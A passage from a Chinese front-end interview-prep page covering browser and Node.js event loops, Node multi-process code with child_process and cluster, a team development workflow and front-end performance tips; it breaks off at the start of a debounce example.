<ul><li>宏任务在<code>页面渲染之后</code>执行</li> <li>微任务在<code>页面渲染之前</code>执行</li> <li>也就是微任务在下一轮<code>DOM</code>渲染之前执行，宏任务在<code>DOM</code>渲染之后执行</li></ul></li></ul> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/01/fe5986f609f48612.png" loading="lazy" class="lazy"></p> <div class="language-js extra-class"><pre class="language-js"><code>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'start'</span><span class="token punctuation">)</span>
<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span> 
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'timeout'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'promise then'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'end'</span><span class="token punctuation">)</span>

<span class="token comment">// 输出</span>
<span class="token comment">// start </span>
<span class="token comment">// end </span>
<span class="token comment">// promise then</span>
<span class="token comment">// timeout</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 分析</span>

<span class="token comment">// 等同步代码执行完后，先从微任务队列中获取（微任务队列优先级高），队列先进先出</span>

<span class="token comment">// 宏任务 MarcoTask 队列</span>
<span class="token comment">// 如setTimeout 1000ms到1000ms后才会放到队列中</span>
<span class="token keyword">const</span> MarcoTaskQueue <span class="token operator">=</span> <span class="token punctuation">[</span>
  <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'timeout'</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  fn <span class="token comment">// ajax回调放到宏任务队列中等待</span>
<span class="token punctuation">]</span>  

<span class="token function">ajax</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> fn<span class="token punctuation">)</span> <span class="token comment">// ajax 宏任务 如执行需要300ms</span>


<span class="token comment">// ********** 宏任务和微任务中间隔着 【DOM 渲染】 ****************</span>

<span class="token comment">// 微任务 MicroTask 队列</span>
<span class="token keyword">const</span> MicroTaskQueue <span class="token operator">=</span> <span class="token punctuation">[</span>
  <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'promise then'</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">]</span>

<span class="token comment">// 等宏任务和微任务执行完后 Event Loop 继续监听（一旦有任务到了宏任务微任务队列就会立马拿过来执行）...</span>
</code></pre></div><div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>Event Loop<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
  <span class="token keyword">const</span> p <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span>
  p<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'new paragraph'</span>
  document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>
  <span class="token keyword">const</span> list <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'length----'</span><span class="token punctuation">,</span> list<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token comment">// 2</span>

  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'start'</span><span class="token punctuation">)</span>
  <span class="token comment">// 宏任务在页面渲染之后执行</span>
  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> list <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'length on timeout----'</span><span class="token punctuation">,</span> list<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token comment">// 2</span>
    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'阻塞 timeout'</span><span class="token punctuation">)</span> <span class="token comment">// 阻塞JS执行和渲染</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token comment">// 微任务在页面渲染之前执行</span>
  Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> list <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'length on promise.then----'</span><span class="token punctuation">,</span> list<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token comment">// 2</span>
    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'阻塞 promise'</span><span class="token punctuation">)</span> <span class="token comment">// 阻塞JS执行和渲染</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'end'</span><span class="token punctuation">)</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p><img alt="" data-src="https://s.poetries.work/uploads/2023/01/4ad9b7d93fa9ad2b.png" loading="lazy" class="lazy"></p> <p><strong>2. nodejs中的事件循环</strong></p> <ul><li>nodejs也是单线程，也需要异步</li> <li>异步任务也分为：宏任务 + 微任务</li> <li>但是，它的宏任务和微任务分为不同的类型，有不同的优先级</li> <li>和浏览器的主要区别就是<code>类型</code>和<code>优先级</code>，理解了这里就理解了nodejs的事件循环</li></ul> <p><strong>宏任务类型和优先级</strong></p> <blockquote><p>类型分为6个，优先级从高到底执行</p></blockquote> <ul><li><strong>Timer</strong>：<code>setTimeout</code>、<code>setInterval</code></li> <li><strong>I/O callbacks</strong>：处理网络、流、TCP的错误回调</li> <li><strong>Idle,prepare</strong>：闲置状态（nodejs内部使用）</li> <li><strong>Poll轮询</strong>：执行<code>poll</code>中的<code>I/O</code>队列</li> <li><strong>Check检查</strong>：存储<code>setImmediate</code>回调</li> <li><strong>Close callbacks</strong>：关闭回调，如<code>socket.on('close')</code></li></ul> <blockquote><p><strong>注意</strong>：<code>process.nextTick</code>优先级最高，<code>setTimeout</code>比<code>setImmediate</code>优先级高</p></blockquote> <p><strong>执行过程</strong></p> <ul><li>执行同步代码</li> <li>执行微任务（<code>process.nextTick</code>优先级最高）</li> <li>按顺序执行6个类型的宏任务（每个开始之前都执行当前的微任务）</li></ul> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/01/0e07c6f647f1a3c5.png" loading="lazy" class="lazy"></p> <p><strong>总结</strong></p> <ul><li>浏览器和nodejs的事件循环流程基本相同</li> <li>nodejs宏任务和微任务分类型，有优先级。浏览器里面的宏任务和微任务是没有类型和优先级的</li> <li>node17之后推荐使用<code>setImmediate</code>代替<code>process.nextTick</code>（如果使用<code>process.nextTick</code>执行复杂任务导致后面的卡顿就得不偿失了，尽量使用低优先级的api去执行异步）</li></ul> <div class="language-js extra-class"><pre class="language-js"><code>console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'start'</span><span class="token punctuation">)</span>
<span class="token function">setImmediate</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'setImmediate'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'timeout'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'promise then'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
process<span class="token punctuation">.</span><span class="token function">nextTick</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'nextTick'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'end'</span><span class="token punctuation">)</span>

<span class="token comment">// 输出</span>
<span class="token comment">// start</span>
<span class="token comment">// end</span>
<span class="token comment">// nextTick</span>
<span class="token comment">// promise then</span>
<span class="token comment">// timeout</span>
<span class="token comment">// setImmediate</span>
</code></pre></div><h3 id="nodejs如何开启多进程-进程如何通讯"><a href="#nodejs如何开启多进程-进程如何通讯" class="header-anchor">#</a> nodejs如何开启多进程，进程如何通讯</h3> <p><strong>进程process和线程thread的区别</strong></p> <ul><li>进程，<code>OS</code>进行资源分配和调度的最小单位，有独立的内存空间</li> <li>线程，<code>OS</code>进程运算调度的最小单位，共享进程内存空间</li> <li>JS是单线程的，但可以开启多进程执行，如<code>WebWorker</code></li></ul> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/01/030cb840c0edabe7.png" loading="lazy" class="lazy"></p> <p><strong>为何需要多进程</strong></p> <ul><li>多核CPU，更适合处理多进程</li> <li>内存较大，多个进程才能更好利用（单进程有内存上限）</li> <li>总之，压榨机器资源，更快、更节省</li></ul> <p><strong>如何开启多进程</strong></p> <ul><li>开启子进程 <code>child_process.fork</code>和<code>cluster.fork</code> <ul><li><code>child_process.fork</code>用于单个计算量较大的计算</li> <li><code>cluster</code>用于开启多个进程，多个服务</li></ul></li> <li>使用<code>send</code>和<code>on</code>传递消息</li></ul> <p><strong>使用child_process.fork方式</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> fork <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fork

<span class="token keyword">const</span> server <span class="token operator">=</span> http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>url <span class="token operator">===</span> <span class="token string">'/get-sum'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'主进程 id'</span><span class="token punctuation">,</span> process<span class="token punctuation">.</span>pid<span class="token punctuation">)</span>

    <span class="token comment">// 开启子进程 计算结果返回</span>
    <span class="token keyword">const</span> computeProcess <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token string">'./compute.js'</span><span class="token punctuation">)</span>
    computeProcess<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'开始计算'</span><span class="token punctuation">)</span> <span class="token comment">// 发送消息给子进程开始计算，在子进程中接收消息调用计算逻辑，计算完成后发送消息给主进程</span>

    computeProcess<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token parameter">data</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'主进程接收到的信息：'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'sum is '</span> <span class="token operator">+</span> data<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>

    computeProcess<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'close'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'子进程因报错而退出'</span><span class="token punctuation">)</span>
      computeProcess<span class="token punctuation">.</span><span class="token function">kill</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 关闭子进程</span>
      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
server<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">'localhost: 3000'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// compute.js</span>

<span class="token comment">/**
 * @description 子进程，计算
 */</span>

<span class="token keyword">function</span> <span class="token function">getSum</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">let</span> sum <span class="token operator">=</span> <span class="token number">0</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    sum <span class="token operator">+=</span> i
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> sum
<span class="token punctuation">}</span>

process<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token parameter">data</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'子进程 id'</span><span class="token punctuation">,</span> process<span class="token punctuation">.</span>pid<span class="token punctuation">)</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'子进程接收到的信息: '</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>

  <span class="token keyword">const</span> sum <span class="token operator">=</span> <span class="token function">getSum</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

  <span class="token comment">// 发送消息给主进程</span>
  process<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>sum<span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><p><strong>使用cluster方式</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> cpuCoreLength <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">cpus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length
<span class="token keyword">const</span> cluster <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'cluster'</span><span class="token punctuation">)</span>

<span class="token comment">// 主进程</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>cluster<span class="token punctuation">.</span>isMaster<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cpuCoreLength<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      cluster<span class="token punctuation">.</span><span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 根据核数 开启子进程</span>
    <span class="token punctuation">}</span>

    cluster<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'exit'</span><span class="token punctuation">,</span> <span class="token parameter">worker</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'子进程退出'</span><span class="token punctuation">)</span>
      cluster<span class="token punctuation">.</span><span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 进程守护</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
  <span class="token comment">// 多个子进程会共享一个 TCP 连接，提供一份网络服务</span>
  <span class="token keyword">const</span> server <span class="token operator">=</span> http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    res<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>
    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'done'</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
  server<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>


<span class="token comment">// 工作中 使用PM2开启进程守护更方便</span>
</code></pre></div><h2 id="_11-综合题目"><a href="#_11-综合题目" class="header-anchor">#</a> 11 综合题目</h2> <h3 id="你们的工作流程是怎么样的"><a href="#你们的工作流程是怎么样的" class="header-anchor">#</a> 你们的工作流程是怎么样的</h3> <p><strong>流程图</strong></p> <p>下图是完整的大厂前端项目研发流程图</p> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/02/7d1c0a6aff18214a.png" loading="lazy" class="lazy"></p> <p><strong>项目角色</strong></p> <ul><li>项目委员会：这是一个很虚的角色，即能确定项目是否要做的那帮人，有时候可能就是一个高级经理就能拍板确定。和我们实际开发没啥关系，不用去关心他。</li> <li><code>PM</code>：产品经理，也是一个项目的推动者，即兼职项目经理的角色。</li> <li><code>UE</code>：交互设计师，负责页面布局、交互的设计，不负责视图的细节。</li> <li><code>UI</code>：视觉设计师，交互确定之后，设计页面样式。注意，很多情况下，<code>UE</code> 和 <code>UI</code> 是一个人。</li> <li><code>RD</code>：后端开发人员。</li> <li><code>CRD</code>：客户端开发人员，安卓和 <code>ios</code> 都是。</li> <li><code>FE</code>：前端开发人员。</li> <li><code>QA</code>：测试人员。</li> <li><code>OP</code>：服务器运维人员，一般负责审批上线单</li></ul> <p><strong>主要流程</strong></p> <p><strong>项目立项</strong></p> <ul><li>主要是各个部门的 <code>leader</code> 确定项目要做了，就是“拍板儿”确定。此时不需要工程师参与，因为决定权在于他们。项目立项时没有任何详细的信息，如需求、设计图等，都要后面继续做。</li> <li><strong>编写需求和需求评审</strong> <ul><li><code>PM</code> 根据项目的背景和目标，编写需求文档，画原型图（不是 <code>UI</code> 设计图），然后叫各个角色开会评审。</li> <li>你如果作为 <code>FE</code> 角色去参与评审，要积极提出自己的问题和建议。需求评审不一定一次通过。</li> <li>如果此时 <code>PM</code> 跟你要工作排期，你不要立即回复。回去跟你的 <code>leader</code> 商量之后，给一个谨慎的排期。</li></ul></li> <li><strong>编写技术方案</strong> <ul><li>需求指导设计，设计指导开发。先做技术方案设计，写文档，待评审之后再开发。</li></ul></li> <li><strong>技术方案评审</strong> <ul><li>技术方案写完之后，要叫 <code>leader</code> ，以及其他技术角色人员一起评审。
<ul><li>第一，和其他技术人员确定接口格式，是否都能认同</li> <li>第二，让 <code>leader</code> 或者架构师确定这个设计有没有漏洞、安全问题等</li></ul></li></ul></li> <li><strong>交互视觉设计和评审</strong> <ul><li>需求评审通过之后，<code>UE</code> 和 <code>UI</code> 就开始出设计稿。做完设计稿之后，会叫相关开发人员参与评审。和需求评审一样，你要提出自己的问题和建议。</li></ul></li> <li><strong>开发</strong> <ul><li>上述评审都结束之后，才可以进入开发阶段。开发时要注意开发规范，及时 <code>code review</code>，写单元测试。</li></ul></li> <li><strong>视觉联调</strong> <ul><li>网页界面开发完成之后，要找 <code>UI</code> 人员来视觉联调，让他们确认是否可以。如果不可以，就直接修改，直到评审通过。</li> <li>这一步要尽早执行，不要等待临上线了，再去调整 <code>UI</code> 界面。</li></ul></li> <li><strong>程序联调</strong> <ul><li>代码功能开发完之后，要和其他相关技术人员（<code>RD</code>、<code>CRD</code>）进行接口联调。就是在开发环境下，先把系统对接起来，看看会不会出错。</li> <li>注意，接口联调不是测试，不用太过于项目，能把最基本的功能跑通即可。</li></ul></li> <li><strong>自测</strong> <ul><li>对于自己开发的功能，一定要自己按照需求测试一遍。不要求测试的很详细，至少也把基本功能跑通。</li> <li>这一步是为了防止提测之后被 <code>QA</code> 发现基本功能不可用，就很尴尬。人家会觉得你不靠谱。</li></ul></li> <li><strong>提测</strong> <ul><li>自测完成之后，即可把代码提测给 <code>QA</code> 。这一步很关键，要发邮件，抄送给项目组的相关成员。</li></ul></li> <li><strong>测试</strong> <ul><li><code>QA</code> 进行详细的功能测试。测试期间会有 <code>bug</code> 反馈，要及时修复 <code>bug</code> ，并及时让 <code>QA</code> 回归测试。</li> <li>测试期间要积极和 <code>QA</code> 沟通，最好每天都开一个站会。</li></ul></li> <li><strong>上线 &amp; 回归测试</strong> <ul><li><code>QA</code> 测试完成会发邮件全体通报测试通过，测试就可以准备上线。</li> <li>上线之后要及时和 <code>QA</code> 组织回归测试，待回归测试完成之后才可以通知：上线完成</li></ul></li> <li><strong>项目总结（可选）</strong> <ul><li>回顾一下经过，总结一下得失，积累一点经验，这样才能慢慢成长</li></ul></li></ul> <h3 id="工作中遇到过哪些项目难点-是如何解决的"><a href="#工作中遇到过哪些项目难点-是如何解决的" class="header-anchor">#</a> 工作中遇到过哪些项目难点，是如何解决的</h3> <p><strong>遇到问题要注意积累</strong></p> <ul><li>每个人都会遇到问题，总有几个问题让你头疼</li> <li>日常要注意积累，解决了问题要自己写文章复盘</li></ul> <p><strong>如果之前没有积累</strong></p> <ul><li>回顾一下半年之内遇到的难题</li> <li>思考当时解决方案，以及解决之后的效果</li> <li>写一篇文章记录一下，答案就有了</li></ul> <p><strong>答案模板</strong></p> <ul><li>描述问题：背景 + 现象 + 造成的影响</li> <li>问题如何被解决：分析 + 解决</li> <li>自己的成长：学到了什么 + 以后如何避免</li></ul> <p><strong>一个示例</strong></p> <ul><li>问题：编辑器只能回显JSON格式的数据，而不支持老版本的HTML格式</li> <li>解决：将老版本的HTML反解析成JSON格式即可解决</li> <li>成长：要考虑完整的输入输出 + 考虑旧版本用户 + 参考其他产品</li></ul> <h3 id="前端性能优化"><a href="#前端性能优化" class="header-anchor">#</a> 前端性能优化</h3> <p><strong>前言</strong></p> <ul><li>是一个综合性问题，没有标准答案，但要求尽量全面</li> <li>某些细节可能会问：防抖、节流等</li></ul> <p><strong>性能优化原则</strong></p> <ul><li>多使用内存、缓存或其他方法</li> <li>减少<code>CPU</code>计算量，减少网络加载耗时</li></ul> <p><strong>从何入手</strong></p> <ul><li><strong>让加载更快</strong> <ul><li>减少资源体积：压缩代码</li> <li>减少访问次数：合并代码，<code>SSR</code>服务端渲染，缓存
<ul><li><strong>SSR</strong> <ul><li>服务端渲染：将网页和数据一起加载，一起渲染</li> <li>非<code>SSR</code>模式（前后端分离）：先加载网页，在加载数据，在渲染数据</li></ul></li> <li><strong>缓存</strong> <ul><li>静态资源加<code>hash</code>后缀，根据文件内容计算<code>hash</code></li> <li>文件内容不变，则<code>hash</code>不变，则<code>url</code>不变</li> <li><code>url</code>和文件不变，则会自动触发<code>http</code>缓存机制，返回<code>304</code> <img alt="" data-src="https://s.poetries.work/uploads/2023/02/3a284db5c7da6390.png" loading="lazy" class="lazy"></li></ul></li></ul></li> <li>减少请求时间：<code>DNS</code>预解析，<code>CDN</code>，<code>HTTP2</code> <ul><li><strong>DNS预解析</strong> <ul><li><code>DNS</code>解析：将域名解析为<code>IP</code>地址</li> <li><code>DNS</code>预解析：提前解析域名，将域名解析为<code>IP</code>地址</li> <li><code>DNS</code>预解析的方式：<code>&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//www.baidu.com&quot;&gt;</code></li></ul></li> <li><strong>CDN</strong> <ul><li><code>CDN</code>：内容分发网络，将资源分发到离用户最近的服务器上</li> <li><code>CDN</code>的优点：加快资源加载速度，减少服务器压力</li> <li><code>CDN</code>的缺点：增加了网络延迟，增加了服务器成本
<img alt="" data-src="https://s.poetries.work/uploads/2023/02/e81a3bb1769d3e74.png" loading="lazy" class="lazy"></li></ul></li> <li><strong>HTTP2</strong> <ul><li><code>HTTP2</code>：<code>HTTP</code>协议的下一代版本</li> <li><code>HTTP2</code>的优点：多路复用，二进制分帧，头部压缩，服务器推送</li></ul></li></ul></li></ul></li> <li><strong>让渲染更快</strong> <ul><li><code>CSS</code>放在<code>head</code>，<code>JS</code>放在<code>body</code>下面</li> <li>尽早开始执行<code>JS</code>，用<code>DOMContentLoaded</code>触发</li></ul> <div class="language-js extra-class"><pre class="language-js"><code>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// 页面的全部资源加载完才会执行，包括图片、视频等</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'DOMContentLoaded'</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// DOM渲染完才执行，此时图片、视频等可能还没有加载完</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><ul><li>懒加载（图片懒加载，上滑加载更多）
<img alt="" data-src="https://s.poetries.work/uploads/2023/02/8f0de9086d90c75c.png" loading="lazy" class="lazy"></li> <li>对<code>DOM</code>查询进行缓存
<img alt="" data-src="https://s.poetries.work/uploads/2023/02/93d7e1f458b5b1a1.png" loading="lazy" class="lazy"></li> <li>频繁<code>DOM</code>操作，合并到一起插入到<code>DOM</code>结构
<img alt="" data-src="https://s.poetries.work/uploads/2023/02/5b7fc06e1aef4c9f.png" loading="lazy" class="lazy"></li> <li>节流、防抖，让渲染更流畅
<ul><li><strong>防抖</strong> <ul><li>防抖动是将多次执行变为<code>最后一次执行</code></li> <li>适用于：<code>input</code>、<code>click</code>等</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">const</span> input <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'input'</span><span class="token punctuation">)</span>
<span class="token comment">// 防抖</span>
